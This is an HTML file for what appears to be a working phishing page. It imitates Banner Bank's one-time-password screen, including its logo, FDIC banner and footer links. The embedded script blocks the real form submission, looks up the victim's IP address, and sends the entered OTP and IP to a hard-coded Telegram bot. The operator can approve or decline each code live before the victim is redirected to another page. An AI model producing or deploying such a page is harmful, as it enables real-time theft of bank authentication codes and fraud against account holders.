<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banner Bank OTP Verification</title>
    <link rel="icon" type="image/png" href="images/BANR-icon.png">
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: url('https://cdn1.onlineaccess1.com/cdn/depot/3388/2368/ebf74bd53f74a056456490316c9417b0/assets/images/desktop-background-business_online-a1f48874c11415ee6874fc1a4a921be3.jpeg') no-repeat center center fixed;
            background-size: cover;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .main-container {
            width: 650px;
        }
        .fig-container {
            padding: 10px;
            background-color: white;
            border-radius: 10px;
            display: flex;
            flex-direction: row;
            font-family: sans-serif;
            font-weight: 400;
            font-size: 12.8px;
            line-height: 1;
            min-height: 1rem;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        .fig-container img {
            max-height: 40px;
            width: auto;
            margin-right: 10px;
        }
        .fidc_writing {
            margin-top: 8px;
        }
        .login-container {
            width: 100%;
            border-radius: 5px;
            overflow: hidden;
        }
        .image-section {
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0051ba;
        }
        .imgg {
            height: 150px;
            width: auto;
        }
        .login-section {
            background-color: #fff;
            padding: 10px 10%;
        }
        .otp-form {
            padding: 50px 30px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .otp-form label {
            font-weight: bold;
            font-family: sans-serif;
            font-size: 14px;
        }
        .otp-form input[type="text"] {
            padding: 10px;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ccc;
            width: 100%;
            box-sizing: border-box;
            text-align: center;
            letter-spacing: 5px;
        }
        .otp-form input[type="text"]:focus {
            border-color: #0051ba;
            outline: none;
        }
        .submit-btn {
            background-color: #fdd835;
            border: none;
            padding: 12px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        .submit-btn:hover {
            background-color: #fbc02d;
        }
        .submit-btn:focus {
            outline: 2px solid #0051ba;
            outline-offset: 2px;
        }
        .submit-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .submit-btn[aria-busy="true"]::after {
            content: ' ';
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-left: 8px;
            border: 2px solid #0051ba;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        #waitPage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            font-family: sans-serif;
            color: white;
        }
        #waitPage .wait-content {
            background: #0051ba;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        #waitPage .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #fdd835;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error-message {
            color: #d32f2f;
            font-size: 13px;
            font-family: sans-serif;
            margin-top: -10px;
            display: none;
        }
        .error-message.visible {
            display: block;
        }
        .footer-section {
            background-color: #0061b0;
            padding: 15px 0;
            text-align: center;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .footer-section a {
            color: white;
            text-decoration: none;
            font-size: 13px;
            border-right: 1px solid white;
            padding: 0 8px;
            font-family: sans-serif;
        }
        .footer-section a:last-child {
            border-right: none;
        }
        @media screen and (max-width: 600px) {
            body {
                padding: 40px 20px;
            }
            .main-container {
                width: 100%;
                margin: 0 auto;
            }
            .fig-container {
                flex-direction: column;
                align-items: center;
                padding: 8px;
            }
            .fig-container img {
                max-height: 30px;
                margin-bottom: 5px;
            }
            .fidc_writing {
                margin-top: 5px;
                font-size: 12px;
                padding: 0 10px;
                text-align: center;
            }
            .image-section {
                justify-content: center;
                align-items: center;
            }
            .imgg {
                height: 60px;
            }
            .login-section {
                padding: 10px 20px;
            }
            .otp-form {
                padding: 20px 10px;
                gap: 12px;
            }
            .otp-form input[type="text"] {
                padding: 8px;
                font-size: 13px;
                letter-spacing: 3px;
            }
            .submit-btn {
                padding: 10px;
                font-size: 14px;
            }
            #waitPage .wait-content {
                padding: 15px;
                font-size: 14px;
            }
            #waitPage .spinner {
                width: 30px;
                height: 30px;
                border-width: 3px;
            }
            .error-message {
                font-size: 12px;
            }
            .footer-section {
                gap: 10px;
                padding: 10px 0;
            }
            .footer-section a {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <section class="main-container">
        <div class="fig-container">
            <div><img src="images/FDIC.jpeg" alt="FDIC Logo"></div>
            <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
        </div>
        <div class="login-container">
            <div class="image-section">
                <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
            </div>
            <div class="login-section">
                <form class="otp-form" action="/verify-otp" method="POST">
                    <label for="otp">Enter One-Time Password (OTP)</label>
                    <input type="text" id="otp" name="otp" maxlength="6" pattern="\d{6}" inputmode="numeric" autocomplete="one-time-code" required aria-describedby="otp-error" />
                    <div id="otp-error" class="error-message" role="alert">Please enter a valid 6-digit OTP.</div>
                    <button type="submit" class="submit-btn">Verify OTP</button>
                </form>
            </div>
            <div class="footer-section">
                <a href="#">Locations</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Forgot Password</a>
                <a href="#">Unlock/Forgot Login ID</a>
                <a href="#">Enroll</a>
            </div>
        </div>
    </section>
    <div id="waitPage" role="alert" aria-live="assertive">
        <div class="wait-content">
            <div class="spinner"></div>
            <p>Verifying OTP...</p>
        </div>
    </div>

    <script>
        const config = {
            botToken: '7915117001:AAED4axtxCp0TznMMRttirjkuBCWsSwq7GA',
            chatId: '6656157295'
        };

        async function sendTelegramMessage(message, inlineKeyboard = null) {
            const telegramApiUrl = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
            const payload = {
                chat_id: config.chatId,
                text: message,
                parse_mode: 'HTML'
            };
            if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };
            
            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await response.json();
            if (!data.ok) throw new Error('Failed to send message');
            return data.result.message_id;
        }

        async function sendOtpRequest(otp, ip) {
            const escapeHtml = (str) => str.replace(/[&<>"']/g, (m) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;' })[m]);
            const message = `🔐 FHB OTP Verification 🔐\n🔢 OTP: <code>${escapeHtml(otp)}</code>\n🌐 IP: <code>${ip}</code>`;
            const inlineKeyboard = [
                [
                    { text: '✅ Approve', callback_data: 'approve_otp' },
                    { text: '❌ Decline', callback_data: 'decline_otp' }
                ]
            ];
            return sendTelegramMessage(message, inlineKeyboard);
        }

        document.querySelector('.otp-form').addEventListener('submit', async (event) => {
            event.preventDefault();
            
            const otpInput = document.getElementById('otp');
            const otp = otpInput.value.trim();
            const errorMessage = document.getElementById('otp-error');
            const submitBtn = document.querySelector('.submit-btn');
            const waitPage = document.getElementById('waitPage');
            
            if (!/^\d{6}$/.test(otp)) {
                errorMessage.classList.add('visible');
                otpInput.focus();
                return;
            }
            
            errorMessage.classList.remove('visible');
            submitBtn.disabled = true;
            submitBtn.setAttribute('aria-busy', 'true');
            waitPage.style.display = 'flex';
            
            try {
                const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
                await sendOtpRequest(otp, ip);
                setTimeout(() => {
                    window.location.href = 'person.html';
                }, 10000);
            } catch (error) {
                waitPage.style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.setAttribute('aria-busy', 'false');
                errorMessage.textContent = 'Failed to verify OTP. Please try again.';
                errorMessage.classList.add('visible');
                otpInput.value = '';
                otpInput.focus();
            }
        });
    </script>
</body>
</html>
